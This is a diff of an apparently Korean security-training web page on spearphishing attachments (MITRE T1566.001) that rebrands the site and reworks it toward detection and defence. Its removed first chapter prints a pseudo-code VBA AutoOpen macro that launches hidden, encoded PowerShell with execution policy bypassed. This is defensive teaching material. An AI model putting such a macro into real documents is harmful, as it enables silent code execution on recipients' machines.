@@ -1,34 +1,52 @@
 <!DOCTYPE html>
 <html lang="ko" class="light" data-technique-id="T1566.001" data-level="intermediate">
 <head>
-    <script>(function(){if(new URLSearchParams(window.location.search).get('preview')==='1')return;try{var k='sb-bnwbybawqrnhznirivfg-auth-token';var s=sessionStorage.getItem(k);if(!s||!JSON.parse(s)){window.location.replace('/login?redirect='+encodeURIComponent(window.location.href));}}catch(e){window.location.replace('/login');}})();</script>
-    <script>var _eduDynLoaded=false;(async function(){try{var S='https://bnwbybawqrnhznirivfg.supabase.co';var K='sb_publishable_fiXeTnAxpTatUSnC0ZvOWg_x5eSbL1w';var r=await fetch(S+'/rest/v1/edu_html_content?page_id=eq.t1566-001-spearphishing-attachment-intermediate&select=content&limit=1',{headers:{'apikey':K,'Authorization':'Bearer '+K}});if(r.ok){var d=await r.json();if(d&&d.length>0&&d[0].content){_eduDynLoaded=true;document.open();document.write(d[0].content);document.close();return;}}}catch(e){}document.documentElement.classList.add('edu-ready');})();setTimeout(function(){if(!_eduDynLoaded)document.documentElement.classList.add('edu-ready');},3000);</script>
-    <style>html:not(.edu-ready) body{visibility:hidden;}html.edu-ready body{visibility:visible;}</style>
-    <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
-    <meta name="description" content="(주)갓루트(GOTROOT) 사이버보안 교육 — T1566.001 중급: 스피어피싱 첨부파일 분석과 탐지">
-    <meta name="author" content="(주)갓루트 GOTROOT">
+    <script>
+        (function() {
+            try {
+                var key = 'sb-bnwbybawqrnhznirivfg-auth-token';
+                var session = sessionStorage.getItem(key);
+                if (!session || !JSON.parse(session)) {
+                    var redirect = encodeURIComponent(window.location.href);
+                    window.location.replace('/login?redirect=' + redirect);
+                }
+            } catch(e) { window.location.replace('/login'); }
+        })();
+    </script>
+    <script>
+        var _eduDynLoaded = false;
+        (async function() {
+            try {
+                var SUPA = 'https://bnwbybawqrnhznirivfg.supabase.co';
+                var KEY  = 'sb_publishable_fiXeTnAxpTatUSnC0ZvOWg_x5eSbL1w';
+                var res = await fetch(SUPA + '/rest/v1/edu_html_content?page_id=eq.t1566-001-spearphishing-attachment-intermediate&select=content&limit=1', { headers: { 'apikey': KEY, 'Authorization': 'Bearer ' + KEY } });
+                if (res.ok) { var data = await res.json(); if (data && data.length > 0 && data[0].content) { _eduDynLoaded = true; document.open(); document.write(data[0].content); document.close(); return; } }
+            } catch(e) {}
+            document.documentElement.classList.add('edu-ready');
+        })();
+        setTimeout(function() { if (!_eduDynLoaded) document.documentElement.classList.add('edu-ready'); }, 3000);
+    </script>
+    <style>html:not(.edu-ready) body { visibility: hidden; } html.edu-ready body { visibility: visible; }</style>
+    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.tailwindcss.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdn.tailwindcss.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: blob:; connect-src 'self' https://*.supabase.co; frame-src 'none'; object-src 'none'; base-uri 'self';" />
-    <meta http-equiv="X-Content-Type-Options" content="nosniff" /><meta name="referrer" content="strict-origin-when-cross-origin" />
-    <title>GOTROOT EDU | T1566.001 중급: 스피어피싱 첨부파일 분석과 탐지 — (주)갓루트</title>
+    <meta http-equiv="X-Content-Type-Options" content="nosniff" />
+    <title>ROOT14 EDU | T1566.001 중급: 스피어피싱 첨부파일 탐지와 방어</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
     <script src="https://cdn.tailwindcss.com"></script>
-    <script>tailwind.config={darkMode:'class',theme:{extend:{fontFamily:{sans:['Inter','sans-serif'],mono:['JetBrains Mono','monospace']},colors:{cbg:'#FFF8F0',cyel:'#F4D06F',cteal:'#9DD9D2',cdark:'#1e293b',cgray:'#475569',slate:{850:'#151e2e',900:'#0f172a',950:'#020617'}}}}}</script>
+    <script>tailwind.config = { darkMode: 'class', theme: { extend: { fontFamily: { sans: ['Inter','sans-serif'], mono: ['JetBrains Mono','monospace'] }, colors: { cbg:'#FFF8F0', cyel:'#F4D06F', cteal:'#9DD9D2', cdark:'#1e293b', cgray:'#475569' } } } }</script>
     <style>
-        body{scroll-behavior:smooth;background-color:#FFF8F0;color:#1e293b;transition:background-color .3s,color .3s;}
-        .glass-panel{background:rgba(255,255,255,0.7);backdrop-filter:blur(16px);-webkit-backdrop-filter:blur(16px);border:1px solid rgba(59,130,246,0.3);box-shadow:0 8px 32px rgba(30,41,59,0.05);}
-        .dark body{background-color:#0f172a;color:#f8fafc;}.dark .glass-panel{background:rgba(30,41,59,0.7);border:1px solid rgba(59,130,246,0.2);box-shadow:0 8px 32px rgba(0,0,0,0.4);}
-        .hl-teal{color:#0f766e;font-weight:700;}.dark .hl-teal{color:#9DD9D2;}
-        .hl-yel{color:#b45309;font-weight:700;}.dark .hl-yel{color:#F4D06F;}
-        .hl-blue{color:#1d4ed8;font-weight:700;}.dark .hl-blue{color:#60a5fa;}
-        .nav-item.active{background:linear-gradient(90deg,rgba(59,130,246,0.2) 0%,transparent 100%);border-left:4px solid #3b82f6;color:#1d4ed8;font-weight:700;}
-        .dark .nav-item.active{background:linear-gradient(90deg,rgba(96,165,250,0.15) 0%,transparent 100%);border-left:4px solid #60a5fa;color:#60a5fa;}
-        .terminal-bg{background-color:#1e293b;color:#9DD9D2;font-family:'JetBrains Mono',monospace;}
+        body { scroll-behavior:smooth; background-color:#FFF8F0; color:#1e293b; transition: background-color 0.3s ease, color 0.3s ease; }
+        .glass-panel { background:rgba(255,255,255,0.7); backdrop-filter:blur(16px); border:1px solid rgba(59,130,246,0.3); box-shadow:0 8px 32px rgba(30,41,59,0.05); }
+        .dark body { background-color:#0f172a; color:#f8fafc; }
+        .dark .glass-panel { background:rgba(30,41,59,0.7); border:1px solid rgba(59,130,246,0.2); box-shadow:0 8px 32px rgba(0,0,0,0.4); }
+        .hl-teal { color:#0f766e; font-weight:700; } .dark .hl-teal { color:#9DD9D2; }
+        .hl-yel { color:#b45309; font-weight:700; } .dark .hl-yel { color:#F4D06F; }
+        .hl-blue { color:#1d4ed8; font-weight:700; } .dark .hl-blue { color:#60a5fa; }
+        .nav-item.active { background:linear-gradient(90deg,rgba(59,130,246,0.2) 0%,transparent 100%); border-left:4px solid #3b82f6; color:#1d4ed8; font-weight:700; }
+        .dark .nav-item.active { background:linear-gradient(90deg,rgba(96,165,250,0.15) 0%,transparent 100%); border-left:4px solid #60a5fa; color:#60a5fa; }
+        .terminal-bg { background-color:#1e293b; color:#9DD9D2; font-family:'JetBrains Mono',monospace; }
         ::-webkit-scrollbar{width:8px;}::-webkit-scrollbar-track{background:transparent;}::-webkit-scrollbar-thumb{background:#3b82f6;border-radius:4px;}.dark ::-webkit-scrollbar-thumb{background:#60a5fa;}
-        .drag-item{cursor:grab;user-select:none;transition:transform 0.2s,box-shadow 0.2s;}.drag-item:active{cursor:grabbing;}
-        .drag-item.dragging{opacity:0.5;transform:scale(0.95);}
-        .drop-zone.drag-over{border:2px dashed #3b82f6;background:rgba(59,130,246,0.1);}
-        .match-btn{transition:all 0.2s;cursor:pointer;}.match-btn:hover{transform:scale(1.05);}.match-btn.correct{background:#059669!important;color:white!important;border-color:#059669!important;}.match-btn.wrong{background:#dc2626!important;color:white!important;border-color:#dc2626!important;}
-        .step-btn{transition:all 0.3s;}.step-btn.active{border-color:#3b82f6!important;background:rgba(59,130,246,0.1)!important;}.step-btn.completed{border-color:#059669!important;background:rgba(5,150,105,0.1)!important;}
+        .match-btn{transition:all 0.2s;cursor:pointer;}.match-btn:hover{transform:scale(1.05);}.match-btn.correct{background:#059669!important;color:white!important;}.match-btn.wrong{background:#dc2626!important;color:white!important;}
         .code-blank{display:inline-block;min-width:80px;border-bottom:2px dashed #3b82f6;padding:0 4px;text-align:center;color:#3b82f6;font-weight:bold;}
         .code-blank.correct{border-color:#059669;color:#059669;background:rgba(5,150,105,0.1);}.code-blank.wrong{border-color:#dc2626;color:#dc2626;background:rgba(220,38,38,0.1);}
     </style>
@@ -36,7 +54,7 @@
 <body class="flex flex-col h-screen overflow-hidden selection:bg-blue-200 selection:text-blue-900 transition-colors duration-300">
     <!-- Brand Header Bar -->
     <div class="w-full px-4 py-1.5 flex items-center justify-between border-b border-slate-200 dark:border-slate-700 bg-white/90 dark:bg-slate-900/90 backdrop-blur-sm shrink-0 z-[60]" style="font-family:'JetBrains Mono',monospace;">
-        <div class="flex items-center gap-2"><span style="font-size:9px;font-weight:900;color:#bb3e03;letter-spacing:0.25em;">GOTROOT</span><span style="font-size:8px;color:#94a3b8;">|</span><span style="font-size:8px;color:#64748b;" class="hidden sm:inline">(주)갓루트 · 사이버보안 교육 플랫폼</span></div>
+        <div class="flex items-center gap-2"><span style="font-size:9px;font-weight:900;color:#bb3e03;letter-spacing:0.25em;">ROOT14</span><span style="font-size:8px;color:#94a3b8;">|</span><span style="font-size:8px;color:#64748b;" class="hidden sm:inline">ROOT14 Academy · 사이버보안 교육 플랫폼</span></div>
         <div class="flex items-center gap-3">
             <span style="font-size:8px;color:#3b82f6;font-weight:700;background:rgba(59,130,246,0.1);padding:2px 8px;border-radius:4px;border:1px solid rgba(59,130,246,0.3);">INTERMEDIATE</span>
             <button onclick="window.location.href='/'" style="font-size:8px;color:#bb3e03;background:transparent;border:1px solid rgba(187,62,3,0.3);padding:3px 10px;border-radius:4px;cursor:pointer;font-family:inherit;">← 매트릭스 대시보드</button>
@@ -48,790 +66,780 @@
     <button onclick="toggleTheme()" class="fixed top-12 right-6 z-50 p-3 rounded-full glass-panel hover:scale-110 transition-transform shadow-lg border border-blue-400"><span id="theme-icon" class="text-xl">🌙</span></button>
     <button onclick="window.location.href='/'" class="fixed top-12 left-4 z-50 md:hidden flex items-center gap-1 glass-panel px-3 py-2 rounded-full text-xs font-bold text-slate-700 dark:text-slate-300 border border-blue-400/50 hover:border-blue-400 shadow transition-all">← 대시보드</button>
 
-    <!-- Sidebar -->
-    <aside class="w-64 glass-panel border-r border-blue-400/30 h-full flex flex-col hidden md:flex shrink-0 z-40">
-        <div class="p-6 border-b border-blue-400/30">
-            <button onclick="window.location.href='/'" class="flex items-center gap-1.5 text-xs text-slate-500 hover:text-blue-700 mb-4 transition-colors group"><span class="group-hover:-translate-x-0.5 transition-transform">←</span><span>대시보드로 돌아가기</span></button>
-            <h1 class="text-xl font-bold font-mono hl-blue tracking-tighter">ATT&CK Matrix</h1>
-            <p class="text-xs text-cgray dark:text-slate-400 mt-2">T1566.001: Phishing: Spearphishing Attachment</p>
-            <span class="inline-block mt-2 text-[10px] font-bold bg-blue-500/10 text-blue-600 dark:text-blue-400 border border-blue-400/30 px-2 py-0.5 rounded">🔵 중급 (Intermediate)</span>
+    <!-- Sidebar Navigation -->
+    <aside class="hidden md:flex w-64 shrink-0 flex-col bg-white/50 dark:bg-slate-900/50 border-r border-slate-200 dark:border-slate-700 overflow-y-auto">
+        <div class="p-4 border-b border-slate-200 dark:border-slate-700">
+            <div class="text-[10px] font-mono text-slate-500 mb-1">T1566.001 · Intermediate</div>
+            <h2 class="font-extrabold text-base text-slate-800 dark:text-slate-100 leading-tight">스피어피싱 첨부파일<br><span class="text-blue-600 dark:text-blue-400">탐지와 방어</span></h2>
         </div>
-        <nav class="flex-1 overflow-y-auto py-4" id="sidebar-nav">
-            <button onclick="go('ch1')" class="nav-item active w-full text-left px-6 py-2.5 text-xs transition-colors text-cgray dark:text-slate-400 hover:text-blue-700 dark:hover:text-blue-400" data-target="ch1">1. Office 매크로 코드 분석</button>
-            <button onclick="go('ch2')" class="nav-item w-full text-left px-6 py-2.5 text-xs transition-colors text-cgray dark:text-slate-400 hover:text-blue-700 dark:hover:text-blue-400" data-target="ch2">2. 이메일 헤더 포렌식</button>
-            <button onclick="go('ch3')" class="nav-item w-full text-left px-6 py-2.5 text-xs transition-colors text-cgray dark:text-slate-400 hover:text-blue-700 dark:hover:text-blue-400" data-target="ch3">3. 첨부파일 동적 분석</button>
-            <button onclick="go('ch4')" class="nav-item w-full text-left px-6 py-2.5 text-xs transition-colors text-cgray dark:text-slate-400 hover:text-blue-700 dark:hover:text-blue-400" data-target="ch4">4. OLE 구조와 oletools</button>
-            <button onclick="go('ch5')" class="nav-item w-full text-left px-6 py-2.5 text-xs transition-colors text-cgray dark:text-slate-400 hover:text-blue-700 dark:hover:text-blue-400" data-target="ch5">5. Sigma 탐지 규칙</button>
-            <button onclick="go('ch6')" class="nav-item w-full text-left px-6 py-2.5 text-xs transition-colors text-cgray dark:text-slate-400 hover:text-blue-700 dark:hover:text-blue-400" data-target="ch6">6. YARA 규칙 기초</button>
-            <button onclick="go('ch7')" class="nav-item w-full text-left px-6 py-2.5 text-xs transition-colors text-cgray dark:text-slate-400 hover:text-blue-700 dark:hover:text-blue-400" data-target="ch7">7. 이메일 보안 게이트웨이</button>
-            <button onclick="go('ch8')" class="nav-item w-full text-left px-6 py-2.5 text-xs transition-colors text-cgray dark:text-slate-400 hover:text-blue-700 dark:hover:text-blue-400" data-target="ch8">8. 사용자 보안 인식 교육</button>
-            <button onclick="go('minilab-0')" class="nav-item w-full text-left px-6 py-2.5 text-xs transition-colors text-cgray dark:text-slate-400 hover:text-blue-700 dark:hover:text-blue-400" data-target="minilab-0">9. Mini Lab — 이메일 헤더 매칭</button>
-            <button onclick="go('minilab-1')" class="nav-item w-full text-left px-6 py-2.5 text-xs transition-colors text-cgray dark:text-slate-400 hover:text-blue-700 dark:hover:text-blue-400" data-target="minilab-1">10. Mini Lab — 첨부파일 분석 절차</button>
-            <button onclick="go('minilab-2')" class="nav-item w-full text-left px-6 py-2.5 text-xs transition-colors text-cgray dark:text-slate-400 hover:text-blue-700 dark:hover:text-blue-400" data-target="minilab-2">11. Mini Lab — SPF 레코드 빈칸 채우기</button>
-            <button onclick="go('quiz')" class="nav-item w-full text-left px-6 py-2.5 text-xs transition-colors text-cgray dark:text-slate-400 hover:text-blue-700 dark:hover:text-blue-400" data-target="quiz">Q. 종합 퀴즈</button>
+        <nav class="flex-1 p-2 space-y-0.5 text-xs">
+            <a class="nav-item block px-3 py-2 rounded cursor-pointer hover:bg-slate-100 dark:hover:bg-slate-800 transition-colors border-l-4 border-transparent" data-target="ch1" onclick="go('ch1')">Ch.1 보안 환경에서 피싱 실패 체감</a>
+            <a class="nav-item block px-3 py-2 rounded cursor-pointer hover:bg-slate-100 dark:hover:bg-slate-800 transition-colors border-l-4 border-transparent" data-target="ch2" onclick="go('ch2')">Ch.2 이메일 게이트웨이 차단 분석</a>
+            <a class="nav-item block px-3 py-2 rounded cursor-pointer hover:bg-slate-100 dark:hover:bg-slate-800 transition-colors border-l-4 border-transparent" data-target="ch3" onclick="go('ch3')">Ch.3 ASR Rule 매크로 차단</a>
+            <a class="nav-item block px-3 py-2 rounded cursor-pointer hover:bg-slate-100 dark:hover:bg-slate-800 transition-colors border-l-4 border-transparent" data-target="ch4" onclick="go('ch4')">Ch.4 Sysmon 이벤트 ID별 탐지</a>
+            <a class="nav-item block px-3 py-2 rounded cursor-pointer hover:bg-slate-100 dark:hover:bg-slate-800 transition-colors border-l-4 border-transparent" data-target="ch5" onclick="go('ch5')">Ch.5 YARA 규칙으로 피싱 탐지</a>
+            <a class="nav-item block px-3 py-2 rounded cursor-pointer hover:bg-slate-100 dark:hover:bg-slate-800 transition-colors border-l-4 border-transparent" data-target="ch6" onclick="go('ch6')">Ch.6 Sigma 규칙 기초</a>
+            <a class="nav-item block px-3 py-2 rounded cursor-pointer hover:bg-slate-100 dark:hover:bg-slate-800 transition-colors border-l-4 border-transparent" data-target="ch7" onclick="go('ch7')">Ch.7 이메일 헤더 포렌식</a>
+            <a class="nav-item block px-3 py-2 rounded cursor-pointer hover:bg-slate-100 dark:hover:bg-slate-800 transition-colors border-l-4 border-transparent" data-target="ch8" onclick="go('ch8')">Ch.8 공격자 → 방어자 관점 전환</a>
+            <a class="nav-item block px-3 py-2 rounded cursor-pointer hover:bg-slate-100 dark:hover:bg-slate-800 transition-colors border-l-4 border-transparent" data-target="ch9" onclick="go('ch9')">Ch.9 GPO/ASR 방어 설정</a>
+            <a class="nav-item block px-3 py-2 rounded cursor-pointer hover:bg-slate-100 dark:hover:bg-slate-800 transition-colors border-l-4 border-transparent" data-target="quiz" onclick="go('quiz')">📝 탐지 규칙 종합 퀴즈</a>
         </nav>
     </aside>
 
-    <!-- Main Content -->
-    <main class="flex-1 overflow-y-auto h-full relative scroll-smooth" id="main-scroll">
-        <div class="max-w-4xl mx-auto p-6 md:p-12 pb-24 space-y-32">
+    <!-- Mobile Nav -->
+    <div class="md:hidden fixed bottom-0 left-0 right-0 z-50 bg-white/95 dark:bg-slate-900/95 backdrop-blur-sm border-t border-slate-200 dark:border-slate-700 px-2 py-1.5 flex gap-1 overflow-x-auto">
+        <button onclick="go('ch1')" class="nav-item shrink-0 px-2 py-1 text-[10px] rounded border border-transparent">Ch.1</button>
+        <button onclick="go('ch2')" class="nav-item shrink-0 px-2 py-1 text-[10px] rounded border border-transparent">Ch.2</button>
+        <button onclick="go('ch3')" class="nav-item shrink-0 px-2 py-1 text-[10px] rounded border border-transparent">Ch.3</button>
+        <button onclick="go('ch4')" class="nav-item shrink-0 px-2 py-1 text-[10px] rounded border border-transparent">Ch.4</button>
+        <button onclick="go('ch5')" class="nav-item shrink-0 px-2 py-1 text-[10px] rounded border border-transparent">Ch.5</button>
+        <button onclick="go('ch6')" class="nav-item shrink-0 px-2 py-1 text-[10px] rounded border border-transparent">Ch.6</button>
+        <button onclick="go('ch7')" class="nav-item shrink-0 px-2 py-1 text-[10px] rounded border border-transparent">Ch.7</button>
+        <button onclick="go('ch8')" class="nav-item shrink-0 px-2 py-1 text-[10px] rounded border border-transparent">Ch.8</button>
+        <button onclick="go('ch9')" class="nav-item shrink-0 px-2 py-1 text-[10px] rounded border border-transparent">Ch.9</button>
+        <button onclick="go('quiz')" class="nav-item shrink-0 px-2 py-1 text-[10px] rounded border border-transparent">📝</button>
+    </div>
 
-            <!-- Header -->
-            <header class="text-center pt-8">
-                <div class="inline-block px-4 py-1 rounded-full bg-blue-500/20 border border-blue-400 hl-blue font-mono text-sm mb-4">Initial Access</div>
-                <h1 class="text-4xl md:text-5xl font-extrabold tracking-tight mb-4 text-[#1e293b] dark:text-white">Spearphishing Attachment Analysis &amp; Detection</h1>
-                <p class="text-cgray dark:text-slate-400 text-lg">스피어피싱 첨부파일 분석과 탐지</p>
-                <div class="flex items-center justify-center gap-4 mt-4 text-xs text-slate-500 dark:text-slate-500">
-                    <span>⏱ 약 45분</span><span>·</span><span>📚 8챕터 + 퀴즈</span><span>·</span><span>🧪 3개 미니 랩</span>
-                </div>
-            </header>
+    <!-- Main Content Area -->
+    <main id="main-scroll" class="flex-1 overflow-y-auto scroll-smooth px-4 md:px-8 lg:px-16 py-8 pb-20 md:pb-8">
 
-            <!-- Warning Panel -->
-            <div class="glass-panel rounded-xl p-6 border-l-4 border-l-red-500 bg-red-50/50 dark:bg-red-900/10">
-                <h3 class="font-bold text-lg mb-2 text-red-600 dark:text-red-400">⚠️ 윤리적 사용 경고</h3>
-                <p class="text-sm text-cgray dark:text-slate-300 leading-relaxed">이 교육 자료는 <strong>방어 목적의 보안 분석 역량 향상</strong>을 위해 제공됩니다. 실제 피싱 공격에 사용하거나 허가 없이 타인의 시스템에 적용하는 것은 <span class="text-red-600 dark:text-red-400 font-bold">법적 처벌 대상</span>입니다. 모든 실습은 허가된 환경에서만 수행하세요.</p>
+        <!-- ===================== Ch.1 보안 환경에서 피싱 실패 체감 ===================== -->
+        <section id="ch1" data-chapter-id="ch1" class="section-observe mb-16 max-w-4xl mx-auto opacity-0 translate-y-10 transition-all duration-700">
+            <div class="flex items-center gap-3 mb-6">
+                <span class="shrink-0 w-10 h-10 rounded-xl bg-blue-600 text-white flex items-center justify-center font-black text-sm shadow">01</span>
+                <h2 class="text-2xl md:text-3xl font-extrabold text-slate-800 dark:text-white">보안 환경에서 피싱 실패 체감</h2>
             </div>
-
-            <!-- Overview Panel -->
-            <div class="glass-panel rounded-xl p-8 border-l-4 border-l-blue-500 relative overflow-hidden">
-                <div class="absolute -top-6 -right-6 text-[120px] opacity-[0.04] select-none pointer-events-none">📧</div>
-                <h2 class="text-2xl font-bold mb-4 text-blue-700 dark:text-blue-400">악성 첨부파일을 분석하고 탐지 규칙을 작성할 수 있나요?</h2>
-                <p class="text-cgray dark:text-slate-300 leading-relaxed mb-6">이 중급 과정에서는 스피어피싱 이메일의 첨부파일을 분석하는 실무 기법을 학습합니다. Office 매크로 코드 분석, 이메일 헤더 포렌식, 샌드박스 동적 분석, oletools를 활용한 OLE 구조 분석, 그리고 Sigma/YARA 탐지 규칙 작성까지 다룹니다.</p>
-                <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
-                    <div class="bg-blue-50 dark:bg-blue-900/20 p-4 rounded-lg border border-blue-300 dark:border-blue-700 text-center">
-                        <div class="text-2xl mb-2">📎</div>
-                        <div class="font-bold text-sm text-blue-700 dark:text-blue-400">매크로 코드 분석</div>
-                        <div class="text-xs text-slate-500 dark:text-slate-400 mt-1">VBA AutoOpen 매크로와 OLE 구조를 분석합니다</div>
-                    </div>
-                    <div class="bg-blue-50 dark:bg-blue-900/20 p-4 rounded-lg border border-blue-300 dark:border-blue-700 text-center">
-                        <div class="text-2xl mb-2">🔍</div>
-                        <div class="font-bold text-sm text-blue-700 dark:text-blue-400">이메일 헤더 포렌식</div>
-                        <div class="text-xs text-slate-500 dark:text-slate-400 mt-1">SPF, DKIM, DMARC 검증으로 위조를 탐지합니다</div>
-                    </div>
-                    <div class="bg-blue-50 dark:bg-blue-900/20 p-4 rounded-lg border border-blue-300 dark:border-blue-700 text-center">
-                        <div class="text-2xl mb-2">📝</div>
-                        <div class="font-bold text-sm text-blue-700 dark:text-blue-400">탐지 규칙 작성</div>
-                        <div class="text-xs text-slate-500 dark:text-slate-400 mt-1">Sigma와 YARA로 악성 문서를 탐지합니다</div>
-                    </div>
+            <div class="glass-panel rounded-2xl p-6 md:p-8 space-y-6">
+                <div class="bg-blue-50 dark:bg-blue-900/30 p-4 rounded-xl border border-blue-200 dark:border-blue-700">
+                    <p class="text-sm font-bold text-blue-700 dark:text-blue-300">🎯 학습 목표</p>
+                    <p class="text-sm text-slate-600 dark:text-slate-300 mt-1">보안 솔루션이 갖춰진 환경에서 스피어피싱 공격이 어떻게 차단되는지 전체 흐름을 이해합니다.</p>
                 </div>
-                <div class="mt-6 bg-blue-50 dark:bg-blue-900/10 border border-blue-300 dark:border-blue-700 rounded-lg p-4 text-center">
-                    <p class="text-sm text-blue-700 dark:text-blue-400">💡 <strong>이 과정을 마치면</strong> → 고급 과정에서 난독화된 매크로 디코딩과 APT 그룹별 피싱 캠페인 분석을 학습합니다</p>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">왜 중급부터 "방어"를 먼저 배울까?</h3>
+                <p class="text-sm leading-relaxed text-slate-600 dark:text-slate-300">초급 과정에서 공격자의 도구와 기법을 배웠습니다. 이제 <span class="hl-blue">방어자(Blue Team)</span> 시점에서 동일한 공격이 어떻게 탐지되고 차단되는지 배울 차례입니다. 실무 보안 운영에서는 공격 기법을 아는 것만큼 <span class="hl-teal">탐지 규칙을 작성하고 검증하는 능력</span>이 중요합니다.</p>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">보안 계층 방어 (Defense in Depth)</h3>
+                <p class="text-sm leading-relaxed text-slate-600 dark:text-slate-300">스피어피싱 첨부파일 공격은 단일 보안 솔루션이 아닌 <span class="hl-yel">다층 방어(Layered Defense)</span>에 의해 차단됩니다. 각 계층이 하나의 체크포인트 역할을 합니다.</p>
+
+                <div class="terminal-bg rounded-xl p-4 text-xs overflow-x-auto">
+<pre>공격자가 피싱 메일 발송
+      │
+      ▼
+┌─────────────────────────────────────┐
+│ Layer 1: 이메일 게이트웨이 (SEG)     │ ← SPF/DKIM/DMARC 검증
+│   → 발신자 위조 탐지, 첨부파일 샌드박스 │    악성 첨부 격리
+└─────────────────────────────────────┘
+      │ (통과 시)
+      ▼
+┌─────────────────────────────────────┐
+│ Layer 2: 엔드포인트 (EDR/ASR)        │ ← 매크로 실행 차단
+│   → ASR Rule, AMSI 스캔, 행위 분석   │    PowerShell 모니터링
+└─────────────────────────────────────┘
+      │ (통과 시)
+      ▼
+┌─────────────────────────────────────┐
+│ Layer 3: 네트워크 (NDR/Proxy)        │ ← C2 통신 차단
+│   → DNS 싱크홀, SSL 복호화, IDS/IPS  │    비정상 트래픽 탐지
+└─────────────────────────────────────┘
+      │ (통과 시)
+      ▼
+┌─────────────────────────────────────┐
+│ Layer 4: SIEM/SOC 모니터링           │ ← 로그 상관분석
+│   → Sysmon + Sigma 규칙 → 알림 발생  │    인시던트 대응 개시
+└─────────────────────────────────────┘</pre>
+                </div>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">이 과정에서 배우는 도구들</h3>
+                <div class="grid grid-cols-2 md:grid-cols-4 gap-3 text-xs">
+                    <div class="bg-slate-100 dark:bg-slate-800 p-3 rounded-lg text-center"><p class="font-bold text-blue-600 dark:text-blue-400">Sysmon</p><p class="text-slate-500 dark:text-slate-400 mt-1">프로세스/네트워크 이벤트 로깅</p></div>
+                    <div class="bg-slate-100 dark:bg-slate-800 p-3 rounded-lg text-center"><p class="font-bold text-blue-600 dark:text-blue-400">YARA</p><p class="text-slate-500 dark:text-slate-400 mt-1">파일 패턴 매칭 규칙</p></div>
+                    <div class="bg-slate-100 dark:bg-slate-800 p-3 rounded-lg text-center"><p class="font-bold text-blue-600 dark:text-blue-400">Sigma</p><p class="text-slate-500 dark:text-slate-400 mt-1">로그 기반 탐지 규칙</p></div>
+                    <div class="bg-slate-100 dark:bg-slate-800 p-3 rounded-lg text-center"><p class="font-bold text-blue-600 dark:text-blue-400">ASR</p><p class="text-slate-500 dark:text-slate-400 mt-1">Attack Surface Reduction</p></div>
+                </div>
+
+                <div class="bg-amber-50 dark:bg-amber-900/20 p-4 rounded-xl border border-amber-200 dark:border-amber-700 text-sm">
+                    <p class="font-bold text-amber-700 dark:text-amber-300">💡 핵심 포인트</p>
+                    <p class="text-slate-600 dark:text-slate-300 mt-1">초급에서 배운 공격 기법(GoPhish, msfvenom, VBA 매크로)이 실제 보안 환경에서 어느 계층에서 탐지·차단되는지 매핑하면서 학습하면 효과적입니다.</p>
                 </div>
             </div>
+        </section>
 
-            <!-- ═══════════════════════════════════════════════ -->
-            <!-- Chapters -->
-            <!-- ═══════════════════════════════════════════════ -->
-            <section id="ch1" class="scroll-mt-12 opacity-0 transform translate-y-10 transition-all duration-700 section-observe">
-                <h2 class="text-2xl font-bold mb-6 flex items-center gap-2 border-b border-blue-400 pb-2 text-[#1e293b] dark:text-white"><span class="hl-blue">#1.</span> Office 매크로 코드 분석</h2>
-                <div class="space-y-6">
-                    <div class="glass-panel p-6 rounded-xl border-l-4 border-l-blue-400">
-                        <div class="text-2xl mb-2">📎</div>
-                        <h3 class="font-bold text-lg mb-2 hl-blue">VBA AutoOpen 매크로</h3>
-                        <p class="text-cgray dark:text-slate-300 leading-relaxed">스피어피싱 첨부파일에서 가장 흔한 공격 벡터는 Office VBA 매크로입니다. AutoOpen() 또는 Document_Open() 프로시저는 문서를 열 때 자동 실행됩니다. 공격자는 이를 통해 PowerShell을 호출하거나, C2 서버에서 추가 페이로드를 다운로드합니다.</p>
-                    </div>
-                    <div class="glass-panel rounded-xl overflow-hidden">
-                        <div class="terminal-bg px-4 py-2 flex items-center justify-between border-b border-slate-600">
-                            <div class="flex items-center gap-2">
-                                <span class="w-3 h-3 rounded-full bg-red-500"></span>
-                                <span class="w-3 h-3 rounded-full bg-yellow-500"></span>
-                                <span class="w-3 h-3 rounded-full bg-green-500"></span>
-                                <span class="text-xs text-slate-400 ml-2 font-mono">malicious_macro.vba</span>
-                            </div>
-                            <span class="text-[10px] text-slate-500 font-mono">VBA</span>
-                        </div>
-                        <div class="bg-red-900/30 px-4 py-2 text-xs text-red-300 font-mono">⚠️ 교육 목적 코드 — 의사 코드 — 실제 악성코드와 다릅니다</div>
-                        <div class="terminal-bg p-4 overflow-x-auto">
-                            <div class="text-slate-500 text-xs leading-relaxed font-mono whitespace-pre">' 악성 매크로 의사 코드 (교육용)</div>
-                            <div class="text-cyan-400 text-xs leading-relaxed font-mono whitespace-pre">Sub AutoOpen()</div>
-                            <div class="text-green-400 text-xs leading-relaxed font-mono whitespace-pre">    ' 문서 열림 시 자동 실행</div>
-                            <div class="text-yellow-400 text-xs leading-relaxed font-mono whitespace-pre">    Dim cmd As String</div>
-                            <div class="text-red-400 text-xs leading-relaxed font-mono whitespace-pre">    cmd = &#34;powershell -ep bypass -w hidden -enc &#34; &amp; payload</div>
-                            <div class="text-orange-400 text-xs leading-relaxed font-mono whitespace-pre">    Shell cmd, vbHide  ' 숨겨진 PowerShell 실행</div>
-                            <div class="text-cyan-400 text-xs leading-relaxed font-mono whitespace-pre">End Sub</div>
-                            <div class="text-white text-xs leading-relaxed font-mono whitespace-pre"></div>
-                            <div class="text-cyan-400 text-xs leading-relaxed font-mono whitespace-pre">Sub Document_Open()</div>
-                            <div class="text-green-400 text-xs leading-relaxed font-mono whitespace-pre">    ' AutoOpen의 대체 진입점</div>
-                            <div class="text-yellow-400 text-xs leading-relaxed font-mono whitespace-pre">    AutoOpen</div>
-                            <div class="text-cyan-400 text-xs leading-relaxed font-mono whitespace-pre">End Sub</div>
-                        </div>
-                    </div>
-                </div>
-            </section>
-
